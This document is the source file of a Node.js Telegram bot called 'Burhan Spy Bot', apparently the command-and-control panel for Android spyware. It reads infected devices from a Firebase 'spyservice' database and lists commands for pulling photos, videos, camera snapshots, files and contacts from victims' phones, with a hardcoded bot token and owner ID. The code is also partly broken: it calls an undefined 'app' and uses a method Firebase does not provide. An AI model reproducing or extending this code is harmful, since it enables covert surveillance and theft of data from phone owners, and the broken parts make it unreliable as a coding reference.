const TelegramBot = require('node-telegram-bot-api');
const admin = require('firebase-admin');

const token = '8811118034:AAEFtRZ5vsk3n8YlXvUrE0csOVNdlsh7IzM';
const YOUR_USER_ID = 2062068620;
const bot = new TelegramBot(token, { polling: true });

// Firebase Setup
const serviceAccount = require('./firebase-service-account.json');
admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: "https://spyservice-c27e1-default-rtdb.europe-west1.firebasedatabase.app"
});

const db = admin.database();

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/files - Scan Files\n/getphoto - Get Photo\n/getvideo - Get Video\n/camera - Camera Snapshot\n/ping - Check device alive\n/stats - Total devices\n/contacts - Fetch contacts\n/help - Commands ka format`);
});

bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    
    db.ref('devices').once('value', (snapshot) => {
        const devices = snapshot.val() || {};
        
        let message = "📱 ALL DEVICES (Total: " + Object.keys(devices).length + ")\n\n";
        const online = Object.entries(devices).filter(([id, d]) => d.online === true);
        const offline = Object.entries(devices).filter(([id, d]) => d.online !== true);
        
        message += "🟢 ONLINE (" + online.length + "):\n";
        online.forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n`;
            message += `🔑 Key: ${d.deviceName || 'N/A'}\n`;
            message += `📅 Expiry: ${d.expiry || 'N/A'}\n`;
            message += `📱 Android: ${d.android || 'N/A'}\n`;
            message += `💾 RAM: ${d.ram || 'N/A'} MB\n`;
            message += `📦 Storage: ${d.storage || 'N/A'} GB\n`;
            message += `🔋 Battery: ${d.battery || 'N/A'}%\n`;
            message += `📊 Installs: ${d.installs || 'N/A'}\n`;
            message += `📊 Status: 🟢 ONLINE\n`;
            message += `🕒 ${d.time || 'N/A'}\n\n`;
        });
        
        message += "\n🔴 OFFLINE (" + offline.length + "):\n";
        offline.forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n`;
            message += `🔑 Key: ${d.deviceName || 'N/A'}\n`;
            message += `📅 Expiry: ${d.expiry || 'N/A'}\n`;
            message += `📱 Android: ${d.android || 'N/A'}\n`;
            message += `💾 RAM: ${d.ram || 'N/A'} MB\n`;
            message += `📦 Storage: ${d.storage || 'N/A'} GB\n`;
            message += `🔋 Battery: ${d.battery || 'N/A'}%\n`;
            message += `📊 Installs: ${d.installs || 'N/A'}\n`;
            message += `📊 Status: 🔴 OFFLINE\n`;
            message += `🕒 ${d.time || 'N/A'}\n\n`;
        });
        
        bot.sendMessage(chatId, message);
    });
});

// Commands Send Karo
bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    const photoPath = match[2];
    db.ref('commands').child(deviceId).setValue('get_photo');
    bot.sendMessage(chatId, `📸 Photo request sent for device ${deviceId}...`);
});

// Authorization check
function isAuthorized(msg) {
    return msg.from.id === YOUR_USER_ID;
}

app.listen(3000, () => {
    console.log("Server running on port 3000");
});
